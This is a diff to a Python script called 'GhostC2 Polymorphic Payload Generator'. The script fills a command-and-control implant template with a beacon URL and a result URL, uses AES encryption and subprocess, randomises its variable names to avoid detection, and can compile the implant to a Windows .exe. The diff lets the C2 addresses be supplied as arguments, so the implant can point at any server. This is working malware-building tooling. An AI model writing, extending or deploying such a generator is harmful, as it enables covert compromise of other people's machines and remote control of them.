@@ -1,20 +1,23 @@
-import random
-import string
-import os
-from datetime import datetime
-import subprocess
-import argparse
-
-TEMPLATE = """
-import requests
-import socket
-import time
-import subprocess
-import json
 import os
 import sys
+import random
+import string
+import subprocess
+import argparse
+from datetime import datetime
 
-sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../utils')))
+# === Payload Template ===
+PAYLOAD_TEMPLATE = '''\
+import os
+import sys
+import time
+import socket
+import json
+import requests
+import subprocess
+
+# Inject absolute path to utils
+sys.path.insert(0, "{abs_utils_path}")
 from crypto import aes_encrypt
 
 C2_URL = "{c2_url}"
@@ -63,13 +66,14 @@ def {beacon_func}():
 
 if __name__ == "__main__":
     {beacon_func}()
-"""
+'''
 
+# === Helpers ===
 def rand_name(length=8):
     return ''.join(random.choices(string.ascii_letters, k=length))
 
-def generate_payload(c2_url, result_url, output_path):
-    var_names = {
+def generate_variable_names():
+    return {
         'beacon_func': rand_name(),
         'host_var': rand_name(),
         'data_var': rand_name(),
@@ -85,10 +89,24 @@ def generate_payload(c2_url, result_url, output_path):
         'encrypted_result': rand_name()
     }
 
-    filled = TEMPLATE.format(c2_url=c2_url, result_url=result_url, **var_names)
+def generate_payload(c2_url, result_url, output_path):
+    var_names = generate_variable_names()
+
+    # Dynamically resolve full absolute path to `server/utils`
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    repo_root = os.path.abspath(os.path.join(script_dir, ".."))  # One level up
+    abs_utils_path = os.path.join(repo_root, "utils")
+    abs_utils_path = abs_utils_path.replace("\\", "\\\\")  # Windows escaping
+
+    filled_code = PAYLOAD_TEMPLATE.format(
+        c2_url=c2_url,
+        result_url=result_url,
+        abs_utils_path=abs_utils_path,
+        **var_names
+    )
 
     with open(output_path, 'w') as f:
-        f.write(filled)
+        f.write(filled_code)
 
     print(f"[+] Polymorphic payload written to: {output_path}")
 
@@ -106,16 +124,21 @@ def compile_to_exe(source_path):
     subprocess.run(build_cmd)
     print("[+] Compilation complete.")
 
+# === Entrypoint ===
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="GhostC2 Polymorphic Payload Generator")
+    parser.add_argument("--c2", default="http://localhost:8080/beacon", help="C2 beacon URL")
+    parser.add_argument("--result", default="http://localhost:8080/result", help="C2 result post URL")
     parser.add_argument("--exe", action="store_true", help="Compile payload to .exe using PyInstaller")
     args = parser.parse_args()
 
     os.makedirs("builds", exist_ok=True)
-
-    filename = f"ghost_payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    filename = f"ghost_payload_{timestamp}.py"
     output_path = os.path.join("builds", filename)
-    generate_payload("http://localhost:8080/beacon", "http://localhost:8080/result", output_path)
+
+    generate_payload(args.c2, args.result, output_path)
 
     if args.exe:
         compile_to_exe(output_path)
+
